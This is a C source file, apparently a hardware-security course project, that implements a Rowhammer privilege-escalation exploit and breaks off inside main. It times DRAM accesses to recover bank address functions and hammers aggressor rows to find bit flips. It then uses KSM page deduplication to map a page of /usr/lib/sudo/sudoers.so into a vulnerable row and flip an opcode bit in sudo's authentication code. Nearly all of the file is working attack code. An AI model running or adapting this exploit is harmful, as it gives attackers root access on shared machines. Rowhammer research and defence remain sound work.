#include <time.h>
#include <stdio.h>
#include <sched.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <assert.h>
#include <string.h>
#include <getopt.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <errno.h>
#include "asm.h"
#include "util.h"
#include "hammer.h" 

/* ------------------------------ GLOBAL CONSTANTS ------------------------------ */

/* MEMORY MAPPING */
#define BUFFER_SIZE (1ULL << 21) 								// Size: 2MB
#define MMAP_FLAGS  (MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED)
#define PROT_FLAGS  (PROT_READ | PROT_WRITE)
#define MADV_FLAGS  (MADV_HUGEPAGE)								// THPeligible

/* DATA FILLING */
#define SAME_FILL   1
#define RANDOM_FILL 2

/* DRAM FUNCTIONS GENERATION */
#define POOL_SIZE 15000					// Conflict Pool Size 
#define ROUNDS 5000						// No of rounds per (base, probe) access
#define CUTOFF 350						// Threshold cutoff for conflict

#define CACHELINE_BITS 6
#define HUGE_PAGE_KNOWN_BITS 21
#define BITS_TO_PERMUTE 7
#define NUM_FUNC_MASKS 4

/* OTHER CONFIG */

#define ROW_BIT_LIMIT 16
#define NACTIVATIONS 4 << 20
#define CONTROLLED_ROWS (1 << 4)
#define CONTROLLED_BANKS 8
#define PAGE_SIZE 4096
#define ROW_SIZE (PAGE_SIZE * 2)
#define OPCODE_OFFSET 0x8dcf
#define ENTROPY_PADDING_SIZE sizeof(uint64_t)

/* UTIL MACROS */
#define PAGE_ALIGN(x) (x - (x % PAGE_SIZE))
#define PAGE_OFFSET(x) (x & ((1 << 12) - 1))

#define PREV_ROW (-1)
#define NEXT_ROW (1)


/* CONFIG AND GETOPT */
hammer_config_t *hammer_conf;

/* HARDCODED DRAM CONFIG */
static uint64_t hwsec05_function_masks[NUM_FUNC_MASKS] = {
	0x22000,	// BA0(13, 17)
	0x44000, 	// BA1(14, 18)
	0x110000, 	// BA2(16, 20)
	0x88000, 	// RANK(15, 19)
};

static uint64_t row_mask = 0x1e0000;

/* ------------------------------------------------------------------------------ */

/* Print header and config */
void print_header(int choice){
	if (choice == 1){
		printf("========================== FLIPPERONI ==========================\n\n");
	}
	else {
		printf("\n================================================================\n\n");
	}
}

/* Hackish way to get full argument name. */
char *retrieve_arg_index(int opt, struct option *long_options){
	int i;

	i = 0;
	while(1){

		if(long_options[i].val == opt){
			return (char *) long_options[i].name;
		}
		else if (long_options[i].val == (uintptr_t) NULL){
			break;
		}
		i++;
	}
	
	return NULL;
}

/* Print usage menu */
void print_usage(){
	printf("\nusage: ddr3 [-arv] [-b bank_no.] [-r random_hammering]");
	printf("\n            [-R hammering_rounds] [-n activation_count]");
	printf("\n            [-p random_pairs] [-P print_rows] [-v verbose]");
	printf("\n            [-h help]\n");

	printf("\nUse -h (--help) flag for detailed argument information.\n\n");
}

/* Print detailed help menu */
void print_help(){
	printf("\nusage: ddr3 [-arv] [-b bank_no.] [-r random_hammering]");
	printf("\n            [-R hammering_rounds] [-n activation_count]");
	printf("\n            [-p random_pairs] [-P print_rows] [-v verbose]");
	printf("\n            [-h help]\n\n\n");

	printf("Detailed argument information:\n\n");
	// printf("These are common ddr3 commands used in various situations:\n");

	// printf("\nFlexibility of bank selection:\n");
	printf("  -a --all                         Will hammer all banks.\n");
	printf("  -b --bank <bank number>          Will hammer provided bank number.                       (Default bank: 0)\n");
	
	// printf("\nConfiguration arguments:\n");
	printf("  -R --rounds <hammering rounds>   Hammering rounds per aggressor row pairs.               (Value required)\n");
	printf("  -p --r_pairs <random pairs>      Hammer provided amount of random aggressor row pairs.   (Value required)\n");
	printf("  -n --nactiv <activation count>   Activation count per hammering round.                   (Value required)\n");
	
	// printf("\nExtra arguments (more to be added soon):\n");
	printf("  -P --print_rows <bank number>	   Print addressable row pairs in a particular bank.       (Default bank: 0)\n");
	
	// printf("\nDebug Level  (more to be added soon):\n");
	printf("  -v --verbose                     Activate debug prints.\n");
	printf("  -h --help                        Print this menu.\n\n");
}

/* Print Hammering config */
void print_config(){

	printf("HAMMERING CONFIGURATION:\n\n");

	if (hammer_conf->random_mode){
		printf("[INFO] Hammering Mode             :   RANDOM\n");
		printf("[INFO] Hammering Bank(s) no.      :   ALL (POSSIBLY)\n");
		printf("[INFO] Random Hammer Pairs        :   %ld\n", hammer_conf->random_pairs);

	}
	else {
		if (hammer_conf->all_banks == 1){
			printf("[INFO] Hammering Mode             :   SEQUENTIAL (BANK BY BANK)\n");
			printf("[INFO] Hammering Bank(s) no.      :   ALL\n");
		}
		else {
			printf("[INFO] Hammering Mode             :   ONE BANK\n");
			printf("[INFO] Hammering Bank(s) no.	  :   %ld\n", hammer_conf->bank_n);
		}
	}
	printf("[INFO] Hammering Rounds           :   %ld\n", hammer_conf->hammering_rounds);
	printf("[INFO] Activations Per Round      :   %0.1f Million\n", (float) hammer_conf->num_row_activations / 1000000);
	printf("[INFO] Printing Rows for Bank %ld   :   %s\n", hammer_conf->bank_n == -1? 0 : hammer_conf->bank_n, hammer_conf->print_rows ? "YES\n" : "NO");
	printf("[INFO] Verbose mode               :   %s\n", hammer_conf->verbose ? "ON\n" : "OFF\n");
}

/* Mapping a contiguous buffer of 2MB and aligning
   it on 2MB boundary for THP collapsing. */
uint8_t *map_contiguous_buffer(void *aligned_address){
	
	uint8_t *buffer;
		/* Mmaping a buffer with aligned 2MB address */
	buffer = (uint8_t *) mmap(aligned_address, BUFFER_SIZE, PROT_FLAGS, MMAP_FLAGS, -1, 0);
	if(buffer == MAP_FAILED) {
		pr_err("[ERROR] MMAP Failed. Exiting...\n");
		exit(EXIT_FAILURE);
	}

	/* Enable Transparent Huge Pages (THP)
	   and making it THPeligible. */
	if(madvise(buffer, BUFFER_SIZE, MADV_FLAGS)) {
		pr_err("[ERROR] MADVISE Failed. Exiting...\n");
		exit_safely(buffer);
	}

	/* Avoid swapping */
    mlock(buffer, BUFFER_SIZE);

	return buffer;
}

/* Fill buffer with data. */
void fill_buffer(uint8_t *buffer, unsigned value, int choice){	

	if (choice == 1){
		/* Fill with known pattern.
		   In this case 0xFF */
		memset(buffer, value, BUFFER_SIZE);

	}
	else if(choice == 2){
		/* TODO: memset with random
		   pattern */

	}
	else {
		pr_err("[ERROR] Wrong Choice for buffer filling. Exiting...\n");
		exit_safely(buffer);
	}
}

static __always_inline uint8_t *get_rand_addr(uint8_t *buf)
{
	return (buf) + (rand() % BUFFER_SIZE);
}

static __always_inline uint8_t get_random_byte(void)
{
	return (rand() % (1 << 8));
}

static void __add_entropy_page(uint8_t *page)
{
	unsigned i;
	for(i = 0; i < ENTROPY_PADDING_SIZE; ++i) {
		page[i] = get_random_byte();
	}
}

static void add_entropy(uint8_t *buf)
{
	unsigned i;

	for(i = 0; i < BUFFER_SIZE; i += PAGE_SIZE) {
		__add_entropy_page(buf + i);
	}
}	

#ifdef CALC_DRAM_CONFIG
static int _qsort_compare(const void *t1, const void *t2)
{
	uint64_t val1, val2;
	val1 = *(uint64_t *) t1;
	val2 = *(uint64_t *) t2;

	if(val1 > val2) {
		return 1;
	}
	else if (val1 < val2) {
		return -1; 
	}
	else {
		return 0;
	}
}

static uint64_t get_median_access_time(volatile uint8_t *a, volatile uint8_t *b)
{
	uint64_t t_start, t_delta, median_time, time_measurements[ROUNDS];
	uint16_t rounds;


	rounds = ROUNDS - 1;
	sched_yield();
	while(rounds--) {
		t_start = rdtscp();
		*a;
		*b;
		t_delta = rdtscp() - t_start;
		time_measurements[rounds] = t_delta;
		lfence();
		clflush(a);
		clflush(b);
		mfence();
	}

	qsort(time_measurements, ROUNDS, sizeof(uint64_t), _qsort_compare);
	median_time = time_measurements[ROUNDS / 2 - 1];

	return median_time;
}

//-----------------------------------------------------------------
// from https://graphics.stanford.edu/~seander/bithacks.html#NextBitPermutation
size_t next_bit_perm(size_t v) {
        size_t t = v | (v - 1);
        return (t + 1) | (((~t & -~t) - 1) >> (__builtin_ctzl(v) + 1));
}

/* General algorithm in mind:
 * 1. start with the smallest possible value made up by n bits (1 <= n <= 6)
 *    and shift that left by 6 as the first 6 bits are needed to address the cacheline.
 * 2. keep getting a new value which has exactly n bits set and test that as the function.
 * 3. if the function holds for the base and probe addresses in the conflicitng pool
 *    (say 98% of probe addresses?) consider it as a valid function.
 * 4. stop when you've reached the highest possible value made up of exactly n bits set for
 *    which we have control over (1 << 30).
 * 5. return an array of candidates to pipe into the fn-reduce script to filter out "duplicates"
 */ 

static uint64_t *calc_functions(uint8_t **conflict_addrs, size_t conflict_addrs_size, uint8_t *base_addr)
{
	uint8_t address_bits;
	uint64_t function, smallest_bit_perm, xor_base, xor_probe;
	uint64_t *func_array;
	size_t array_sz;
	unsigned idx;
	unsigned i;
	uint8_t all_equal;


	array_sz = 50;
	func_array = malloc(sizeof(uint64_t) * array_sz); //if we find more, then realloc
	idx = 0;
	for(address_bits = 1; address_bits < BITS_TO_PERMUTE; ++address_bits) { // 1 <= n <= 6
		smallest_bit_perm = ((1 << address_bits) - 1) << CACHELINE_BITS;
		function = smallest_bit_perm;
		while(function < (1 << HUGE_PAGE_KNOWN_BITS)) { // get max to bit 20
			all_equal = (uint8_t) conflict_addrs_size / 10; // 90%
			for(i = 0; i < conflict_addrs_size; ++i) {
				xor_base = __builtin_parityl(((uintptr_t) base_addr & ((1 << HUGE_PAGE_KNOWN_BITS) - 1)) & function);
				xor_probe = __builtin_parityl(((uintptr_t) conflict_addrs[i] & ((1 << HUGE_PAGE_KNOWN_BITS) - 1)) & function);
				if(xor_base != xor_probe) {
					--all_equal;
					if(!all_equal) {
						break;
					}
				}
			}
			if(all_equal) {
				if(idx == array_sz) {
					array_sz *= 2;
					func_array = realloc(func_array, array_sz * sizeof(uint64_t));
				}
				func_array[idx++] = function;
			}
			function = next_bit_perm(function);
		}
	}

	func_array[idx] = 0;
	pr_debug("INDEX = %u\n", idx);
	return func_array;
}


/* Find DRAM function candidates by 
   generating conflict pool of addresses
   in same bank using time side channels.  */
void generate_dram_functions(uint8_t *buffer){	

	uint8_t *base_addr, *probe_addr;
    uint8_t **seen_addrs, **conflict_addrs;
    size_t seen_addr_elems, conflict_addr_elems;
    uint64_t median_time, *function_candidates;

	seen_addr_elems = 0;
    conflict_addr_elems = 0;

	/* Keeping track of already accesses
	   addresses to avoid them. */
 	seen_addrs 		= malloc(POOL_SIZE * sizeof(uint8_t *));
	conflict_addrs 	= malloc((POOL_SIZE / 2) * sizeof(uint8_t *));
	
	if(!seen_addrs || !conflict_addrs) {
		pr_err("[ERROR] Cannot allocate seen_addr set/array. Exiting...\n");
		exit_safely(buffer);
	}

	/* TODO: Add comment here. */
    srand(time(NULL));

	/* Select random base address */
    base_addr = get_rand_addr(buffer);
	seen_addrs[seen_addr_elems++] = base_addr;

	while(seen_addr_elems < POOL_SIZE - 1) {
		
		/* Select random probe address */
		probe_addr = get_rand_addr(buffer);

		/* Avoid duplicate accesses */
		if(set_contains(seen_addrs, seen_addr_elems, probe_addr)) {
			continue;
		}

		seen_addrs[seen_addr_elems++] = probe_addr;
		
		/* Calculating time access between base
   		   and probe addresses. */
		median_time = get_median_access_time(base_addr, probe_addr);
        //pr_info("%lu\n", median_time);

		/* If the median is above the cut off
		   threshold, add it to conflict pool. */
		if(median_time >= CUTOFF) {
            conflict_addrs[conflict_addr_elems++] = probe_addr;
        }
	}

	/* TODO: */
    function_candidates = calc_functions(conflict_addrs, conflict_addr_elems, base_addr);

	while(*function_candidates != 0) {
		pr_info("0x%lx\n", *function_candidates);
		++function_candidates;
	}
}
#endif

char *bit_string(uint64_t val)
{
    static char bit_str[256];
    char itoa_str[8];
    strcpy(bit_str, "");
    for (int shift = 0; shift < 64; shift++) {
        if ((val >> shift) & 1) {
            if (strcmp(bit_str, "") != 0) {
                strcat(bit_str, "+ ");
            }
            sprintf(itoa_str, "%d ", shift);
            strcat(bit_str, itoa_str);
        }
    }

    return bit_str;
}


uintptr_t dram_to_physical(dram_addr_t dram_addr)
{
	unsigned i, bit_pos;
	uint64_t row_offset;
	uintptr_t physaddr;

	row_offset = __builtin_ctzl(row_mask);
	physaddr = dram_addr.row << row_offset;
	//pr_info("row_bits = %s\n", bit_string(physaddr));
	for(i = 0; i < NUM_FUNC_MASKS; ++i) {

		// make sure that when you set the function bits you're not setting bits which conflict with the row bits.

		if(__builtin_parityl((uintptr_t) physaddr & hwsec05_function_masks[i]) == dram_addr.ch_to_bank[i]) {
			continue;
		}

		if(__builtin_clzl(hwsec05_function_masks[i] & 1L)) { // if hsb of the fn is set, unset the lower one.
			bit_pos = 1 << __builtin_ctzl(hwsec05_function_masks[i]);
		}
		else if(__builtin_ctzl(hwsec05_function_masks[i] & 1L)) { // if lsb of the fn is set, unset the upper one.
			bit_pos = 1 << __builtin_clzl(hwsec05_function_masks[i]);
		}
		
		physaddr ^= bit_pos; // unset the "conflicting bit"
		physaddr |= dram_addr.ch_to_bank[i] << __builtin_ctzl(hwsec05_function_masks[i]); // set the "correct bit"

	}
	// pr_info("final phys_addr %p = %s\n",physaddr, bit_string(physaddr));
	return physaddr;
}

/* Find agressor rows to perform double-sided
   hammering on victim row. */
static uint64_t hammer_rand_pair(uint8_t *buf) {
	
	unsigned i;
	uint8_t *agg1, *v_agg1, *agg2, *v_agg2, *victim, *v_victim;
	dram_addr_t agg1_dram_addr, agg2_dram_addr, victim_dram_addr;
	uint64_t flips;
	uint8_t **flipped_addrs_set;
	size_t flipped_addrs_set_sz;
	uint16_t bank = 0;
	flipped_addrs_set = malloc(sizeof(uint8_t *) * 50);
	flipped_addrs_set_sz = 0;
    
	uint64_t dram_no = 0;

	/* Select a random base address. */
	agg1 = get_rand_addr(buf);

	/* Apply dram functions to get channel 
	   to dram parity array - Selecting Bank. */
	for(i = 0; i < NUM_FUNC_MASKS; ++i) {
		agg1_dram_addr.ch_to_bank[i] = __builtin_parity((uintptr_t) agg1 & hwsec05_function_masks[i]);
		bank |= agg1_dram_addr.ch_to_bank[i] << i;
		agg2_dram_addr.ch_to_bank[i] = agg1_dram_addr.ch_to_bank[i];
		victim_dram_addr.ch_to_bank[i] = agg1_dram_addr.ch_to_bank[i];
		dram_no |= (agg1_dram_addr.ch_to_bank[i]) << i;
	}

    pr_info("DRAM bank no = %ld\n", dram_no);

	/* Apply the row bitmask to the physaddr
	   and shift to get the row number */
	agg1_dram_addr.row = ((uintptr_t) agg1 & row_mask) >> __builtin_ctzl(row_mask);
	
	/* Get victim and 2ns aggressor row */
	victim_dram_addr.row = agg1_dram_addr.row + 1;
	agg2_dram_addr.row = agg1_dram_addr.row + 2;

	/* Get physical address of agg2 row
	   and victim row, and remove column bits from agg1 to align it to start of row for striping*/
	agg1 = (uint8_t *) dram_to_physical(agg1_dram_addr);
	victim = (uint8_t *) dram_to_physical(victim_dram_addr);
	agg2 = (uint8_t *) dram_to_physical(agg2_dram_addr);
	
	/* Get virtual address of aggresor rows
	   and victim row, */
	v_agg2 = (uint8_t *) ((uintptr_t) agg2 | (uintptr_t) buf);
	v_agg1 = (uint8_t *) ((uintptr_t) agg1 | (uintptr_t) buf);
	v_victim = (uint8_t *) ((uintptr_t) victim | (uintptr_t) buf);

	/* Filling 0s in aggresor rows to 
	   see flips */
	memset(v_agg1, 0, ROW_SIZE);
	memset(v_agg2 , 0, ROW_SIZE);
	
	/* Let's get hammering! */
	for(unsigned k = 0; k < hammer_conf->hammering_rounds; k++){
		hammer(v_agg1, v_agg2, hammer_conf->num_row_activations);
	}
	
	/* Check for flips */
	for(unsigned i = 0; i < ROW_SIZE; ++i) {
		if(v_victim[i] != 0xff) {
			pr_info("Flip in BANK %u agg1 %p ---- vic %p ---- agg2 = %p\n",bank,  v_agg1, v_victim, v_agg2);
			pr_info("victim flipped addr = %p, was 0xff is now 0x%x\n", v_victim + i, v_victim[i]);
			++flips;
			if(!set_contains(flipped_addrs_set, flipped_addrs_set_sz, v_victim + i)) {
				flipped_addrs_set[flipped_addrs_set_sz++] = v_victim + i;
			}
		}
	}

	//pr_info("============== TOTAL BIT FLIPS = %lu ==============\n", flips);
	free(flipped_addrs_set);
	return flipped_addrs_set_sz;
}


static uint64_t hammer_rand_pairs(uint8_t *buf, unsigned npairs)
	{	
		uint64_t flips;	
		flips = 0;	
		while(npairs--) {	
			flips += hammer_rand_pair(buf);	
			memset(buf, 0xFF, BUFFER_SIZE); //reset memory	
		}	
		
		return flips;	
	}

#ifdef CALC_DRAM_CONFIG
static uint64_t row_index_sc(uint8_t *buf)	
{	
	unsigned i;	
	uint64_t flips_found, max, row_fn;	
	uint64_t row_mask_candidates[4] = 	
	{		
		0x100000,	
		0x180000,	
		0x1c0000,	
		0x1e0000,	
	};	
	
	flips_found = 0;	
	max = 0;	
	row_fn = 0;	
	for(i = 0; i < 4; ++i) {	
		row_mask = row_mask_candidates[i];	
		flips_found = hammer_rand_pairs(buf, 500);	
		if(flips_found > max) {	
			max = flips_found;	
			row_fn = row_mask;	
		}	
	}	
	
	return row_fn;	
}
#endif

static uintptr_t __row_align_addr(uint8_t *buf, uint8_t *addr)
{
	dram_addr_t dram_addr;
	uintptr_t row_aligned_addr;
	unsigned i;

	for(i = 0; i < NUM_FUNC_MASKS; ++i) {
        dram_addr.ch_to_bank[i] = __builtin_parity((uintptr_t) addr & hwsec05_function_masks[i]);;
    }
	dram_addr.row = ((uintptr_t) addr & row_mask) >> __builtin_ctzl(row_mask);

	row_aligned_addr = (uintptr_t) buf | dram_to_physical(dram_addr);
	pr_info("ROW ALIGNED ADDRESS %p = 0x%lx\n", addr, row_aligned_addr);
	return row_aligned_addr;
}

static uintptr_t __get_adjacent_row(uint8_t *buf, uint8_t *addr, int placement)
{
	dram_addr_t dram_addr;
	unsigned i;

	for(i = 0; i < NUM_FUNC_MASKS; ++i) {
        dram_addr.ch_to_bank[i] = __builtin_parity((uintptr_t) addr & hwsec05_function_masks[i]);;
    }
	dram_addr.row = ((uintptr_t) addr & row_mask) >> __builtin_ctzl(row_mask);

	if(placement == PREV_ROW) {
		dram_addr.row--;	
	}
	else {
		dram_addr.row++;
	}

	return (uintptr_t) buf | dram_to_physical(dram_addr);
}


static template_t * scan_for_flips(uint8_t *buf, uint8_t *vic, uint8_t direction)
{
	template_t *template;
	unsigned i, j;


	if(direction == ZERO_TO_ONE) {
		for(i = ENTROPY_PADDING_SIZE; i < ROW_SIZE; ++i) {
			if(vic[i] != 0x00) {
				pr_info("victim flipped addr = %p, was 0x00 is now 0x%x\n", vic + i, vic[i]);
				for (j = 0; j < NUM_EXPLOITABLE_OPCODES; j++){
					if (((uintptr_t) (vic + i) - opcodes[j].file_offset) % PAGE_SIZE == 0 && (0x00 ^ (1 << opcodes[j].bit_offset)) == vic[i]) {
						pr_info("Template OPCODE NO: %d\n", j);
						template = malloc(sizeof(template_t));
						assert(template != NULL);
						template->addr = (uintptr_t) (vic + i);
						template->op = opcodes[j];
						goto out;
					}
				}
			}
		}
	}
	else {
		for(i = ENTROPY_PADDING_SIZE; i < ROW_SIZE; ++i) {
			if(vic[i] != 0xFF) {
				pr_info("victim flipped addr = %p, was 0xFF is now 0x%x\n", vic + i, vic[i]);
				for (j = 0; j < NUM_EXPLOITABLE_OPCODES; j++){
					if (((uintptr_t) (vic + i) - opcodes[j].file_offset) % PAGE_SIZE == 0 && (0xFF ^ (1 << opcodes[j].bit_offset)) == vic[i]) {
						pr_info("Template OPCODE NO: %d\n", j);
						template = malloc(sizeof(template_t));
						assert(template != NULL);
						template->addr = (uintptr_t) (vic + i);
						template->op = opcodes[j];
						goto out;
					}
				}
			}
		}
	}

out:
	return template;
}


static template_t * hammer_bank(uint8_t *buf, uint16_t bank_n)
{
	dram_addr_t dram_addr;
	uint8_t *p_addr, *v_addr, *agg1, *agg2, *vic;
	uint8_t **addrs;
	unsigned i, j, k;
	template_t *template;

	template = NULL;

	addrs = malloc(sizeof(uint8_t *) * CONTROLLED_ROWS);
	assert(addrs);

    uint64_t dram_no = 0;
	
	//save all the banks we can address
    for(i = 0; i < NUM_FUNC_MASKS; ++i) {
        uint64_t bit = (bank_n & (1 << i)) > 0 ? 1 : 0;
        dram_addr.ch_to_bank[i] = bit;
        dram_no |= bit << i;
    }

    pr_info("DRAM bank no = %s\n", bit_string(dram_no));

    for(i = 0; i < NUM_FUNC_MASKS; i++){
        pr_info("BIT %d: %ld\n", i, dram_addr.ch_to_bank[i]);
    }
	
	// save all the addresses which map to consecutive rows in an array
	for(i = 0; i < CONTROLLED_ROWS; ++i) {
		dram_addr.row = i;
		p_addr = (uint8_t *) dram_to_physical(dram_addr);
		v_addr = (uint8_t *) ((uintptr_t) p_addr | (uintptr_t) buf);
		pr_info("Row %lu -> %p\n", dram_addr.row, v_addr);
		addrs[i] = v_addr;
	}

	//hammer all the A-V-A combinations in our array.
	for(i = 0; i < CONTROLLED_ROWS - 4; ++i) {
		agg1 = addrs[i];
		agg2 = addrs[i + 2];
		vic = addrs[i + 1];
		memset(addrs[i] + ENTROPY_PADDING_SIZE, 0xFF, ROW_SIZE - ENTROPY_PADDING_SIZE);
		memset(addrs[i + 2] + ENTROPY_PADDING_SIZE, 0xFF, ROW_SIZE - ENTROPY_PADDING_SIZE);
		memset(vic + ENTROPY_PADDING_SIZE, 0x00, ROW_SIZE - ENTROPY_PADDING_SIZE);
		pr_info("Hammering agg1 %p ---- vic %p ---- agg2 %p\n", agg1, vic, agg2);

		for(unsigned k = 0; k < hammer_conf->hammering_rounds; k++){
			hammer(addrs[i], addrs[i + 2], hammer_conf->num_row_activations);
		}
		/* Check for flips */
		for(j = ENTROPY_PADDING_SIZE; j < ROW_SIZE; ++j) {
			if(vic[j] != 0x00) {
				pr_info("victim flipped addr = %p, was 0x00 is now 0x%x\n", vic + j, vic[j]);
				for (k = 0; k < NUM_EXPLOITABLE_OPCODES; k++){
					if (((uintptr_t) (vic + j) - opcodes[k].file_offset) % PAGE_SIZE == 0 && (0x00 ^ (1 << opcodes[k].bit_offset)) == vic[j] && opcodes[k].direction == ZERO_TO_ONE) {
						pr_info("Template Found!!!! OPCODE NO: %d\n", k);
						template = malloc(sizeof(template_t));
						assert(template != NULL);
						template->addr = (uintptr_t) (vic + j);
						template->op = opcodes[k];
						goto out;
					}
				}
			}
		}
		memset(vic + ENTROPY_PADDING_SIZE, 0, ROW_SIZE - ENTROPY_PADDING_SIZE);
	}
out:
	return template;
}

static template_t * hammer_all_banks(uint8_t *buf)
{
	unsigned i;
	template_t *addr;
	
	addr = NULL;
	for(i = 0; i < CONTROLLED_BANKS; ++i) {
		pr_debug("Hammering BANK %u\n", i);
		if((addr = hammer_bank(buf, i)) != NULL) {
			goto out;
		}
	}

out:
	return addr;
}

static template_t * find_template(uint8_t *buf)
{
	template_t *template;

	if((template = hammer_all_banks(buf)) != NULL) {
		goto out;
	}

	pr_info("Tried to hammer all banks for this buffer -> NO templates found\n");

out:
	return template;
}

static void hammer_mask_byte(uint8_t *buf, template_t *template, uint8_t *aggressor_mask, uint8_t *opcode)
{
	uint8_t *target, *agg1, *vic, *agg2;
	unsigned i;
	uint8_t lo_to_high_flips[ROW_SIZE] = {0};
	uint8_t high_to_lo_flips[ROW_SIZE] = {0};

	target = (uint8_t *) (template->addr - PAGE_OFFSET(template->op.file_offset));
	vic = (uint8_t *) __row_align_addr(buf, target);
	agg1 = (uint8_t *) __get_adjacent_row(buf, vic, PREV_ROW);
	agg2 = (uint8_t *) __get_adjacent_row(buf, vic, NEXT_ROW);

	memset(agg1 + ENTROPY_PADDING_SIZE, 0x00, ROW_SIZE - ENTROPY_PADDING_SIZE);
	memset(agg2 + ENTROPY_PADDING_SIZE, 0x00, ROW_SIZE - ENTROPY_PADDING_SIZE);
	memset(vic + ENTROPY_PADDING_SIZE, 0xFF, ROW_SIZE - ENTROPY_PADDING_SIZE);

	hammer(agg1, agg2, hammer_conf->num_row_activations);

	for(i = ENTROPY_PADDING_SIZE; i < ROW_SIZE; ++i) {
		if(vic[i] != 0xFF) {
			pr_debug("Found 1 -> 0 Flip -> Masking Aggressor\n");
			high_to_lo_flips[i] = 1;
		}
	}

	memset(agg1 + ENTROPY_PADDING_SIZE, 0xFF, ROW_SIZE - ENTROPY_PADDING_SIZE);
	memset(agg2 + ENTROPY_PADDING_SIZE, 0xFF, ROW_SIZE - ENTROPY_PADDING_SIZE);
	memset(vic + ENTROPY_PADDING_SIZE, 0x00, ROW_SIZE - ENTROPY_PADDING_SIZE);

	hammer(agg1, agg2, hammer_conf->num_row_activations);

	for(i = ENTROPY_PADDING_SIZE; i < ROW_SIZE - ENTROPY_PADDING_SIZE; ++i) {
		if(vic[i] != 0x00) {
			pr_debug("Found 0 -> 1 Flip -> Masking Aggressor\n");
			lo_to_high_flips[i] = 1;
		}
	}

	for(i = ENTROPY_PADDING_SIZE; i < ROW_SIZE; ++i) {
		if(high_to_lo_flips[i]) {
			aggressor_mask[i] = 0xFF;
		}
		// 0 -> 1 flips seemed to be more common, prioritize them.
		if(lo_to_high_flips[i]) {
			aggressor_mask[i] = 0x00;
		}
	}
	aggressor_mask[PAGE_OFFSET(template->op.file_offset)] = (uint8_t) ~(opcode[0]);

	for(i = 0; i < ROW_SIZE; ++i) {
		pr_info("aggressor mask at idx %u: %x\n", i, aggressor_mask[i]);
	}
}


static int flip_sudoers(uint8_t *buf)
{
	int fd, rv;
	FILE *fd_out;
	template_t *template;
	uint8_t *agg1, *vic, *agg2, *target, saved_sudoers[PAGE_SIZE], opcode[2];
	uint8_t *aggressor_mask;
	unsigned j, k;
	uint8_t op, op1;
	
	
	template = find_template(buf);

	if(!template) {
		rv = -1;
		goto out;
	}
	
	pr_info("\n[+] Template found!!!\n");

	aggressor_mask = malloc(sizeof(uint8_t) * ROW_SIZE);
	assert(aggressor_mask != NULL);

	

	fd = open("/usr/lib/sudo/sudoers.so", O_RDONLY);
	assert(fd > 0);
	pr_info("[+] Sudoers.so opened. \n");


	target = (uint8_t *) (template->addr - PAGE_OFFSET(template->op.file_offset));
	rv = pread(fd, saved_sudoers, PAGE_SIZE, PAGE_ALIGN(template->op.file_offset));
	assert(rv == PAGE_SIZE);

	opcode[0] = saved_sudoers[PAGE_OFFSET(template->op.file_offset)];
	hammer_mask_byte(buf, template, aggressor_mask, opcode);

	pr_info("\n[+] Read Page containing template from sudoers.so into saved_sudoers buffer.\n");

	posix_fadvise(fd, PAGE_ALIGN(template->op.file_offset), PAGE_SIZE, POSIX_FADV_DONTNEED);
	printf("\n[+] TARGET (Page Aligned) = %p \n", target);

	memcpy(target - ROW_SIZE, saved_sudoers, PAGE_SIZE); //copy sudoers page into another page of the THP buffer
	memcpy(target, saved_sudoers, PAGE_SIZE); // copy sudeors page into the actual target page
	op = saved_sudoers[PAGE_OFFSET(template->op.file_offset)]; // Save Opcode we want to flip
	memset(saved_sudoers, 0, PAGE_SIZE); // KSM

	printf("\n[+] Wait for KSM to merge (atleast 1 full scan!) Enter any character when done\n");
	getchar();
	
	vic = (uint8_t *) __row_align_addr(buf, target);
	agg1 = (uint8_t *) __get_adjacent_row(buf, vic, PREV_ROW);
	agg2 = (uint8_t *) __get_adjacent_row(buf, vic, NEXT_ROW);

	
	memcpy(agg1, aggressor_mask, ROW_SIZE);
	memcpy(agg2, aggressor_mask, ROW_SIZE);

	__add_entropy_page(agg1);
	__add_entropy_page(agg1 + PAGE_SIZE);
	__add_entropy_page(agg2);
	__add_entropy_page(agg2 + PAGE_SIZE);

	memset(aggressor_mask, 0, ROW_SIZE);
	free(aggressor_mask);
	

	rv = -1;
	
	hammer(agg1, agg2, hammer_conf->num_row_activations);
	
	
	for(j = ENTROPY_PADDING_SIZE; j < PAGE_SIZE; j++){
		if(PAGE_OFFSET((uintptr_t) (target + j)) == PAGE_OFFSET((uintptr_t) template->op.file_offset)){
			pr_info("[+] Page offset matched!!!\n");
			
			fd_out = fopen("sudo_out", "wb+");
			assert(fd_out != NULL);
			for(k = 0; k < PAGE_SIZE; ++k) {
				fprintf(fd_out, "%02X", *(target + k));
			}
			op1 = *(target - 2 * PAGE_SIZE + j);
			op ^= (1 << template->op.bit_offset);
			if(op == op1){
				pr_info("[+] Managed to flip the template!!! Start praying _/\\_ \n");
			}
		}
	}
	close(fd);
	return 0;
		
out:
	return rv;
}

#ifdef CALC_DRAM_CONFIG
static void print_bank_rows(uint8_t *buf, uint16_t bank_n)
{
	dram_addr_t dram_addr;
	uint8_t *p_addr, *v_addr;
	uint8_t **addrs;
	unsigned i;
	FILE *fp;

	fp = fopen("hwsec05.csv", "w+");
	if(fp == NULL) {
		pr_err("Couldn't create hwsec05.csv\n");
	}

	addrs = malloc(sizeof(uint8_t *) * CONTROLLED_ROWS);
	assert(addrs);

	for(i = 0; i < NUM_FUNC_MASKS; ++i) {
		dram_addr.ch_to_bank[i] = bank_n & (1 << i);
	}

	for(i = 0; i < CONTROLLED_ROWS; ++i) {
		dram_addr.row = i;
		p_addr = (uint8_t *) dram_to_physical(dram_addr);
		v_addr = (uint8_t *) ((uintptr_t) p_addr | (uintptr_t) buf);
		pr_info("Row %lu -> %p\n", dram_addr.row, v_addr);
		addrs[i] = v_addr;
	}

	for(i = 0; i < CONTROLLED_ROWS - 1; ++i) {
		fprintf(fp, "%p, %p\n", addrs[i], addrs[i + 1]);
	}
	fclose(fp);
}	
#endif

int main(int argc, char **argv)
{
    uint8_t *buff;
	void *addr_2mb_align;
	int choice, option_index;
	unsigned j;

	/* Default configuration */
	hammer_conf = malloc(sizeof(hammer_config_t));
	hammer_conf->num_row_activations = NACTIVATIONS;
	hammer_conf->hammering_rounds = 17;
	hammer_conf->random_pairs = 1000;
	hammer_conf->random_mode = 0;
	hammer_conf->print_rows = 0;
	hammer_conf->bank_n = -1;
	hammer_conf->all_banks = 0;
	hammer_conf->verbose = 0;

	/* Command line arguments */
	static struct option long_options[] =
